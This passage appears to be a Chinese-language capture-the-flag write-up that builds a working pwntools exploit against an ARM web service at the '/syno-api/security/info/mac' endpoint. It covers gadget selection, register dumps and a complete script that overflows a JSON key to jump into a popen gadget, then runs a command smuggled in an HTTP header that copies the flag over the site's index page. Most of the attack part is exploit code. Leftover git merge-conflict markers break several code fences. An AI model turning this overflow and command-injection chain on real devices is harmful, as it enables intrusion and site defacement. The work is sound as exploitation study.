ip = '127.0.0.1'
port = 8801

r = remote(ip, port)

p1 = b'a ' + b'a' * (0x60 + 0x24) + b'b' * 4

value = b'""'
json = b'{"' + p1 + b'": ""}'
li(json)

rn = b'\r\n'

p3 = b''
p3 += b'POST /syno-api/security/info/mac HTTP/1.1' + rn
p3 += (b"Content-Length: %d" % len(json)) +rn
p3 += b'Host: 127.0.0.1:8801' + rn
p3 += b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"' + rn
p3 += b'Accept: text/plain, */*; q=0.01' + rn
p3 += b'Content-Type: application/json' + rn
p3 += b'X-Requested-With: XMLHttpRequest' + rn
p3 += b'sec-ch-ua-mobile: ?0' + rn
p3 += b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' + rn
p3 += b'sec-ch-ua-platform: "macOS"' + rn
p3 += b'Origin: http://127.0.0.1:8801' + rn
p3 += b'Sec-Fetch-Site: same-origin' + rn
p3 += b'Sec-Fetch-Mode: cors' + rn
p3 += b'Sec-Fetch-Dest: empty' + rn
p3 += b'Referer: http://127.0.0.1:8801/' + rn
p3 += b'Accept-Encoding: gzip, deflate' + rn
p3 += b'Accept-Language: zh-CN,zh;q=0.9' + rn
p3 += b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg' + rn
p3 += b'Connection: close' + rn
p3 += rn
p3 += json

li('[+] sendling payload')
r.send(p3)

r.interactive()
```

寻找合适的 gadget，符合可见字符，因为 aslr 为 1，最后的利用需要爆破，这里为了方便会关闭 aslr。binary\_base 前面为 0x4 开头的时候 binary 里有些地址 gadget 会符合要求，如下 gadget

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
.text:00014D5C                 STR             R3, [R11,#var_30]
.text:00014D60                 LDR             R0, [R11,#var_38]
.text:00014D64                 BL              _ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::string::c_str(void)
.text:00014D68                 MOV             R2, R0
.text:00014D6C                 LDR             R3, =(aR_0 - 0x14D78) ; "r"
.text:00014D70                 ADD             R3, PC, R3 ; "r"
.text:00014D74                 MOV             R1, R3  ; modes
.text:00014D78                 MOV             R0, R2  ; command
```

这里有很多方法来 getshell，如果采取 rop 利用，R11 这里的地址刚好在栈上，我尝试之后发现如果使用多个 key 和 value，这些值会往上跑，最后可以跑到 r11 这里，此时就可以写很长的命令来执行

还有一种方法是从 `00014D68` 这里的地址开始的 gadget，此时的寄存器状态如下

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
*R0   0x7efff1e0 ◂— 'aaaaaaaa\\MA'
 R1   0x0
*R2   0x7efff1e0 ◂— 'aaaaaaaa\\MA'
*R3   0x414d5c ◂— mov r2, r0
 R4   0x4b7954 ◂— 0xb77f4
 R5   0x0
 R6   0x407464 ◂— mov fp, #0
 R7   0x0
 R8   0x0
 R9   0x0
 R10  0x4b7954 ◂— 0xb77f4
*R11  0x7efff104 —▸ 0x76fb3840 ◂— mov r3, r0
 R12  0x0
*SP   0x7efff0e8 ◂— 0x0
*PC   0x414d5c ◂— mov r2, r0
```

r0 这里可以控制 8 个字节的命令，最后一个字节用；来隔开进行命令执行，但是在调试的时候发现 `00014D68` 这里的地址需要细调，最后的地址为 `00014D5C`，传入自定义的请求头也可以写很长的命令了

exp 如下

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
from pwn import *

context(arch='arm', os='linux', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
lg = lambda x : print('\033[32m' + str(x) + '\033[0m')

context.terminal = ['tmux','splitw','-h']

ip = '127.0.0.1'
port = 8801

r = remote(ip, port)

binary_base = 0x400000

#gadget = 0x14D5c + binary_base
gadget = 0x14D5c + binary_base
#gadget = 0x414d5c
#gadget = 0x00018a7c + binary_base
#gadget = 0x14d60 + binary_base

# 0x00018a7c : mov r0, r2 ; blx r3

cmd = b'$HTTP_A'
cmd = cmd.ljust(8, b';')

p1 = b'a ' + b'b' * (0x60 + 0x24 - 8) + cmd + b'\u005c\u004d\u0041'#p32(gadget)[:3]

value = b'""'
json = b'{"' + p1 + b'": ""}'
li(json)

rn = b'\r\n'

p3 = b''
p3 += b'POST /syno-api/security/info/mac HTTP/1.1' + rn
p3 += (b"Content-Length: %d" % len(json)) +rn
p3 += b'Host: 127.0.0.1:8801' + rn
p3 += b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"' + rn
p3 += b'A: cp /flag /www/index.html' + rn
p3 += b'Accept: text/plain, */*; q=0.01' + rn
p3 += b'Content-Type: application/json' + rn
p3 += b'X-Requested-With: XMLHttpRequest' + rn
p3 += b'sec-ch-ua-mobile: ?0' + rn
p3 += b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' + rn
p3 += b'sec-ch-ua-platform: "macOS"' + rn
p3 += b'Origin: http://127.0.0.1:8801' + rn
p3 += b'Sec-Fetch-Site: same-origin' + rn
p3 += b'Sec-Fetch-Mode: cors' + rn
p3 += b'Sec-Fetch-Dest: empty' + rn
p3 += b'Referer: http://127.0.0.1:8801/' + rn
p3 += b'Accept-Encoding: gzip, deflate' + rn
p3 += b'Accept-Language: zh-CN,zh;q=0.9' + rn
p3 += b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg' + rn
p3 += b'Connection: close' + rn
p3 += rn
p3 += json

li('[+] sendling payload')
r.send(p3)

r.interactive()
```

重新访问就可以看到主页被篡改

## Reference

[https://eqqie.cn/index.php/archives/2076](https://eqqie.cn/index.php/archives/2076)

[https://blog.csdn.net/tuzhutuzhu/article/details/23705485](https://blog.csdn.net/tuzhutuzhu/article/details/23705485)
